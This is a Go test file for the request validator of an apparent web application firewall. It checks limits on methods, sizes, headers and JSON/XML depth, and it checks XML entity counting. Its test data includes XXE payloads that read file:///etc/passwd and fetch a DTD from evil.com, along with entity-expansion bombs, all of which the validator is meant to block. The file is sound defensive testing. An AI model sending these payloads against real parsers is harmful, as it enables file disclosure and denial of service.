package request

import (
	"context"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/barbacana-waf/barbacana/internal/config"
)

func testCfg() config.Resolved {
	return config.Resolved{
		ID:      "test",
		Mode:    config.ModeBlocking,
		Disable: map[string]bool{},
		Accept: config.ResolvedAccept{
			Methods:           []string{"GET", "POST", "PUT", "DELETE"},
			ContentTypes:      []string{},
			MaxBodySize:       10 * 1024 * 1024,
			MaxURLLength:      8192,
			MaxHeaderSize:     16 * 1024,
			MaxHeaderCount:    100,
			RequireHostHeader: true,
		},
		Inspection: config.ResolvedInspection{
			JSONDepth:         20,
			JSONKeys:          1000,
			XMLDepth:          20,
			XMLEntities:       100,
			EvaluationTimeout: 50 * time.Millisecond,
		},
		Protocol:           config.ResolvedProtocol{},
		RunJSONParser:      true,
		RunXMLParser:       true,
		RunMultipartParser: true,
		RunFormParser:      true,
	}
}

func TestAllowedMethods(t *testing.T) {
	v := NewValidator(testCfg())
	r := httptest.NewRequest("TRACE", "/", nil)
	d := v.ValidateRequest(context.Background(), r)
	if !d.Block || d.Protection != AllowedMethods {
		t.Errorf("expected TRACE blocked, got: %+v", d)
	}
}

func TestAllowedMethodPass(t *testing.T) {
	v := NewValidator(testCfg())
	r := httptest.NewRequest("GET", "/api", nil)
	r.Header.Set("Host", "example.com")
	d := v.ValidateRequest(context.Background(), r)
	if d.Block {
		t.Errorf("GET should pass, got: %+v", d)
	}
}

func TestBodySize(t *testing.T) {
	cfg := testCfg()
	cfg.Accept.MaxBodySize = 100
	v := NewValidator(cfg)
	body := strings.NewReader(strings.Repeat("x", 200))
	r := httptest.NewRequest("POST", "/", body)
	r.Header.Set("Host", "example.com")
	r.Header.Set("Content-Type", "application/json")
	r.ContentLength = 200
	d := v.ValidateRequest(context.Background(), r)
	if !d.Block || d.Protection != MaxBodySize {
		t.Errorf("expected body size block, got: %+v", d)
	}
}

func TestURLLength(t *testing.T) {
	cfg := testCfg()
	cfg.Accept.MaxURLLength = 50
	v := NewValidator(cfg)
	r := httptest.NewRequest("GET", "/"+strings.Repeat("a", 100), nil)
	r.Header.Set("Host", "example.com")
	d := v.ValidateRequest(context.Background(), r)
	if !d.Block || d.Protection != MaxURLLength {
		t.Errorf("expected URL length block, got: %+v", d)
	}
}

func TestHeaderCount(t *testing.T) {
	cfg := testCfg()
	cfg.Accept.MaxHeaderCount = 5
	v := NewValidator(cfg)
	r := httptest.NewRequest("GET", "/", nil)
	r.Header.Set("Host", "example.com")
	for i := 0; i < 10; i++ {
		r.Header.Add("X-Test", "value")
	}
	d := v.ValidateRequest(context.Background(), r)
	if !d.Block || d.Protection != MaxHeaderCount {
		t.Errorf("expected header count block, got: %+v", d)
	}
}

func TestContentTypeGating(t *testing.T) {
	cfg := testCfg()
	cfg.Accept.ContentTypes = []string{"application/json"}
	v := NewValidator(cfg)
	r := httptest.NewRequest("POST", "/", strings.NewReader("<xml/>"))
	r.Header.Set("Host", "example.com")
	r.Header.Set("Content-Type", "application/xml")
	r.ContentLength = 6
	d := v.ValidateRequest(context.Background(), r)
	if !d.Block {
		t.Error("expected XML content-type to be rejected for JSON-only route")
	}
}

func TestJSONDepthLimit(t *testing.T) {
	cfg := testCfg()
	cfg.Inspection.JSONDepth = 3
	v := NewValidator(cfg)
	deep := `{"a":{"b":{"c":{"d":"e"}}}}`
	d := v.ValidateJSONBody(context.Background(), []byte(deep))
	if !d.Block || d.Protection != JSONDepthLimit {
		t.Errorf("expected JSON depth block, got: %+v", d)
	}
}

func TestJSONDepthOK(t *testing.T) {
	v := NewValidator(testCfg())
	simple := `{"a":"b","c":"d"}`
	d := v.ValidateJSONBody(context.Background(), []byte(simple))
	if d.Block {
		t.Errorf("simple JSON should pass, got: %+v", d)
	}
}

func TestXMLDepthLimit(t *testing.T) {
	cfg := testCfg()
	cfg.Inspection.XMLDepth = 2
	v := NewValidator(cfg)
	deep := `<a><b><c><d>e</d></c></b></a>`
	d := v.ValidateXMLBody(context.Background(), []byte(deep))
	if !d.Block || d.Protection != XMLDepthLimit {
		t.Errorf("expected XML depth block, got: %+v", d)
	}
}

func TestJSONOnlyRouteSkipsXML(t *testing.T) {
	cfg := testCfg()
	cfg.RunXMLParser = false
	v := NewValidator(cfg)
	deep := `<a><b><c><d>e</d></c></b></a>`
	d := v.ValidateXMLBody(context.Background(), []byte(deep))
	if d.Block {
		t.Error("XML should not be parsed on JSON-only route")
	}
}

func TestCountXMLEntities(t *testing.T) {
	tests := []struct {
		name string
		xml  string
		want int
	}{
		{"no entities", `<?xml version="1.0"?><a><b>hello</b></a>`, 0},
		{"predefined entities are text", `<a>1 &lt; 2 &amp;&amp; 3 &gt; 2 &quot;x&quot; &apos;y&apos;</a>`, 0},
		{"character references are text", `<a>&#60;&#x3C;</a>`, 0},
		{"one declaration, no use", `<!DOCTYPE a [<!ENTITY x "y">]><a/>`, 1},
		{"declaration plus twelve references", `<!DOCTYPE a [<!ENTITY x "data">]><a>` + strings.Repeat("&x;", 12) + `</a>`, 13},
		{"nested declarations", `<!DOCTYPE a [<!ENTITY l0 "x"><!ENTITY l1 "&l0;&l0;&l0;"><!ENTITY l2 "&l1;&l1;&l1;">]><a>&l2;</a>`, 10}, // 3 declarations + 3 + 3 references inside them + 1 in the body
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := countXMLEntities([]byte(tt.xml)); got != tt.want {
				t.Errorf("countXMLEntities = %d, want %d", got, tt.want)
			}
		})
	}
}

// An expansion bomb is one DOCTYPE however many entities it declares and the
// first reference stops Go's decoder, so the count has to come from the bytes.
func TestAnalyzeXMLCountsBombReferencesPastParseError(t *testing.T) {
	bomb := `<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY x "data">]><root>` + strings.Repeat("&x;", 150) + `</root>`
	_, entities, err := analyzeXML([]byte(bomb))
	if err != nil {
		t.Fatal(err)
	}
	if entities != 151 {
		t.Errorf("entities = %d, want 151 (1 declaration + 150 references)", entities)
	}
}

func TestXMLExternalEntities(t *testing.T) {
	tests := []struct {
		name    string
		xml     string
		blocked bool
	}{
		{"external DOCTYPE", `<!DOCTYPE x SYSTEM "//x/x" ><x>a</x>`, true},
		{"external DOCTYPE with public id", `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html/>`, true},
		{"entity SYSTEM", `<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, true},
		{"parameter entity SYSTEM", `<!DOCTYPE x [ <!ENTITY % y SYSTEM "//y/y" > %y; ]><x>a</x>`, true},
		{"parameter entity PUBLIC", `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % xxe PUBLIC "any_text" "http://evil.com/evil.dtd">%xxe;]><root>&xxe;</root>`, true},
		{"lower case keywords", `<!doctype x system "//x/x"><x/>`, true},
		{"internal entity only", `<!DOCTYPE x [<!ENTITY y "text">]><x>&y;</x>`, false},
		{"plain document", `<?xml version="1.0"?><a><b>hello</b></a>`, false},
		{"SYSTEM as ordinary text", `<a><b>the SYSTEM is down</b></a>`, false},
		{"namespaced SOAP", `<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body/></soapenv:Envelope>`, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			d := NewValidator(testCfg()).ValidateXMLBody(context.Background(), []byte(tt.xml))
			if d.Block != tt.blocked {
				t.Fatalf("Block = %v, want %v (%+v)", d.Block, tt.blocked, d)
			}
			if d.Block && d.Protection != XMLExternalEntity {
				t.Errorf("Protection = %q, want %q", d.Protection, XMLExternalEntity)
			}
		})
	}
}

func TestXMLExternalEntitiesLeafCanBeDisabled(t *testing.T) {
	cfg := testCfg()
	cfg.Disable[XMLExternalEntity] = true
	d := NewValidator(cfg).ValidateXMLBody(context.Background(), []byte(`<!DOCTYPE x SYSTEM "//x/x"><x/>`))
	if d.Block {
		t.Errorf("blocked with the leaf disabled: %+v", d)
	}
}
